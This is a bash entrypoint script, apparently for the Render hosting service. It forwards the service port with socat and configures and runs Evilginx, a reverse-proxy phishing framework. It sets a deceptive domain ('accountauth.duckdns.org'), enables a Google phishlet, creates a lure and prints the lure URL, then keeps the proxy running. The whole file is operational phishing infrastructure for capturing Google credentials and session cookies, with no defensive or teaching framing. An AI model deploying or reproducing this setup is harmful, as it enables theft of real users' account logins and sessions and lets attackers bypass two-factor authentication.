#!/bin/bash

# 1. Bridge Render's dynamic port to Evilginx's port 80
socat TCP-LISTEN:${PORT:-8080},fork TCP:127.0.0.1:80 &

# 2. Run configuration commands
script -q -c '/app/evilginx -p /app/phishlets' /dev/null <<EOF
config domain accountauth.duckdns.org
config ipv4 external 127.0.0.1
phishlets hostname google accountauth.duckdns.org
phishlets enable google
lures create google
lures get-url 0
exit
EOF

# 3. Run Evilginx in the foreground to keep it alive and log errors
# The 'exec' replaces the shell process with Evilginx, ensuring it stays running
exec /app/evilginx -p /app/phishlets
